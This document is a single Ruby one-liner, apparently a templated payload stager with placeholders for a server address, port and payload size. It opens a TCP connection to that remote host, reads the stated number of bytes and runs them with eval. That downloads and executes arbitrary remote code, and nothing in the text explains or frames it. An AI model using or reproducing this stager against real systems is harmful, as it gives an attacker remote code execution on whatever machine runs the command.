ruby -e 'require "socket"; s = TCPSocket.open("{{SERVER_IP}}", {{SERVER_PORT}}); data = ""; for i in 1..{{PAYLOAD_SIZE}} do data += s.recv(1); end; s.close; eval(data);'
